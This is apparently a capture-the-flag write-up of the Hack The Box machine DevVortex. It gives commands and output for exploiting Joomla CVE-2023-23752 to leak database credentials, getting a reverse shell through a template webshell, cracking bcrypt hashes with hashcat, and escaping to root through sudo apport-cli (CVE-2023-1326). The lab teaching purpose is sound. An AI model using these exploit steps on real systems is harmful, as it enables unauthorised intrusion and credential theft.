---
title: "DevVortex - Writeup"
linkTitle: "DevVortex"
weight: 7
featured: true
platform: "HTB"
name: "DevVortex"
os: "Linux"
difficulty: "Easy"
points: 20
release: "25 Nov 2023"
ip: "10.129.229.146"
# Drop a real avatar at static/img/htb/devvortex.png and uncomment:
# avatar: "/img/htb/devvortex.png"
tags: ["linux", "joomla", "cve-2023-23752", "vhost-enum", "template-rce", "mysql", "hashcat", "apport-cli", "cve-2023-1326", "root-shell"]
description: "Easy Linux box. Subdomain enumeration reveals a Joomla 4.2.6 install. An unauthenticated API information disclosure leaks DB credentials, admin access gives template-based RCE, and a vulnerable apport-cli sudo permission closes the root path."
---

{{< htb name="DevVortex" os="Linux" difficulty="Easy" points="20" release="25 Nov 2023" ip="10.129.229.146" platform="HTB" >}}

## Reconnaissance

```
(root㉿kali)# nmap 10.129.229.146 -p22,80 -sCV
```

```
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb
```

Add to `/etc/hosts`, browse. Port 80 redirects straight to the domain.

```
(root㉿kali)# echo "10.129.229.146 devvortex.htb" >> /etc/hosts
```

## Enumeration

The devvortex.htb homepage is a static marketing site with nothing actionable.

![DevVortex main site at devvortex.htb](/img/htb/devvortex/01-devvortex-homepage.png)

Fuzz for virtual hosts.

```
(root㉿kali)# ffuf -u http://devvortex.htb -H "Host: FUZZ.devvortex.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -fs 154
```

```
dev                     [Status: 200]
```

```
(root㉿kali)# echo "10.129.229.146 dev.devvortex.htb" >> /etc/hosts
```

![dev.devvortex.htb subdomain showing a different Joomla-powered site](/img/htb/devvortex/02-dev-subdomain.png)

`/administrator` reveals a Joomla admin panel. Pull the manifest XML to get the exact version.

```
(root㉿kali)# curl -s http://dev.devvortex.htb/administrator/manifests/files/joomla.xml
```

![joomla.xml manifest showing version 4.2.6](/img/htb/devvortex/03-joomla-version.png)

```xml
<version>4.2.6</version>
```

Joomla 4.0.0 through 4.2.7 is vulnerable to **CVE-2023-23752**, an unauthenticated information disclosure through the Joomla API.

## Initial Foothold

### CVE-2023-23752 Credential Leak

```
(root㉿kali)# curl -s "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" | python3 -m json.tool
```

```json
{
  "attributes": {
    "user": "lewis",
    "password": "P4ntherg0t1n5r3c0n##",
    "db": "joomla",
    "host": "localhost"
  }
}
```

Database credentials in plaintext, leaked by an endpoint that should require authentication. A second endpoint confirms two usernames, `lewis` and `logan`.

### Joomla Admin Access

![Joomla admin login with lewis credentials](/img/htb/devvortex/04-joomla-admin-login.png)

`lewis:P4ntherg0t1n5r3c0n##` logs in to `/administrator/index.php`.

### Template RCE

Navigate to System → Templates → Site Templates, select the active template, and edit `error.php` to include a one-liner webshell, then trigger a reverse shell through it.

```
(root㉿kali)# rlwrap nc -lnvp 4422
```

![Browser triggering the URL-encoded reverse shell while nc catches the connection as www-data](/img/htb/devvortex/05-reverse-shell.png)

```
connect to [10.10.15.249] from (UNKNOWN) [10.129.229.146] 37248
www-data@devvortex:~/dev.devvortex.htb$
```

## Privilege Escalation

### MySQL Hash Dump

```
www-data@devvortex:~$ mysql -u lewis -p'P4ntherg0t1n5r3c0n##' joomla
```

```sql
SELECT username, password FROM sd4fg_users;
```

```
lewis  | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRXeBmy8m4Y9GjK
logan  | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

```
(root㉿kali)# hashcat -m 3200 logan.hash /usr/share/wordlists/rockyou.txt
```

```
$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
```

### Lateral Move to `logan`

```
www-data@devvortex:~$ su logan
Password: tequieromucho
```

```
logan@devvortex:~$ cat user.txt
```

### Root via `sudo apport-cli` (CVE-2023-1326)

```
logan@devvortex:~$ sudo -l
```

```
(ALL : ALL) /usr/bin/apport-cli
```

CVE-2023-1326: `apport-cli` opens crash reports in a pager but doesn't drop sudo privileges when it does. Any command typed inside the pager runs as root.

```
logan@devvortex:~$ sudo /usr/bin/apport-cli -f -P /var/crash/xxx.crash
```

When the pager opens, type `!bash` to drop into a root shell.

```
!bash
#
# cat /root/root.txt
```

## Lessons learned

- Subdomain enumeration is mandatory before declaring a web surface complete. The main site was fully static but `dev.devvortex.htb` was the entire attack surface.
- Information disclosure CVEs that leak database credentials are their own complete attack chain. CVE-2023-23752 handed over admin access without any brute force or SQLi, a single unauthenticated API call was enough.
- A sudo entry on a tool that spawns a pager is often exploitable. Any application that opens `less` or `more` while retaining elevated privileges can be escaped to a root shell, always check the binary's interactive behavior, not just its primary function.
